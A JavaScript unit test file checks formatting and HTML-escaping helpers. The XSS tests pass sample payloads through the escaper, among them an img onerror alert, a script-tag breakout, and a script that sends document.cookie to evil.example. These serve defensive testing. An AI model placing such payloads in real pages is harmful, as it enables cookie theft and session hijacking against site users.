import { describe, it, expect } from "vitest";
import { fmt, timeAgo, formatDate, escapeHTML, escapeAttribute } from "../../public/js/utils.js";

describe("fmt", () => {
  it("formats numbers with thousands separators", () => {
    expect(fmt(1234567)).toBe("1,234,567");
  });

  it("falls back to 0 for non-numeric input", () => {
    expect(fmt("not a number")).toBe("0");
    expect(fmt(undefined)).toBe("0");
  });
});

describe("timeAgo", () => {
  it("returns 'Just now' for very recent timestamps", () => {
    expect(timeAgo(new Date())).toBe("Just now");
  });

  it("returns a minutes-ago string", () => {
    const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
    expect(timeAgo(fiveMinutesAgo)).toBe("5m ago");
  });

  it("returns 'Yesterday' for exactly one day ago", () => {
    const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000 - 1000);
    expect(timeAgo(oneDayAgo)).toBe("Yesterday");
  });

  it("handles missing or invalid input gracefully", () => {
    expect(timeAgo(null)).toBe("Recently");
    expect(timeAgo("not a date")).toBe("Recently");
  });
});

describe("formatDate", () => {
  it("formats a valid date", () => {
    expect(formatDate("2026-03-15T00:00:00Z")).toMatch(/Mar 1[45], 2026/);
  });

  it("returns an empty string for invalid or missing input", () => {
    expect(formatDate(null)).toBe("");
    expect(formatDate("not a date")).toBe("");
  });
});

describe("escapeHTML / escapeAttribute (XSS protection)", () => {
  it("escapes HTML-significant characters", () => {
    expect(escapeHTML(`<img src=x onerror="alert(1)">`)).toBe(
      "&lt;img src=x onerror=&quot;alert(1)&quot;&gt;"
    );
  });

  it("escapes single quotes", () => {
    expect(escapeHTML(`it's <b>bold</b>`)).toBe("it&#039;s &lt;b&gt;bold&lt;/b&gt;");
  });

  it("handles a realistic malicious repo description", () => {
    const malicious = `Nice project<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`;
    const escaped = escapeHTML(malicious);

    expect(escaped).not.toContain("<script>");
    expect(escaped).toContain("&lt;script&gt;");
  });

  it("returns an empty string for null/undefined", () => {
    expect(escapeHTML(null)).toBe("");
    expect(escapeHTML(undefined)).toBe("");
  });

  it("escapeAttribute behaves the same as escapeHTML", () => {
    expect(escapeAttribute(`"><script>alert(1)</script>`)).toBe(
      escapeHTML(`"><script>alert(1)</script>`)
    );
  });
});
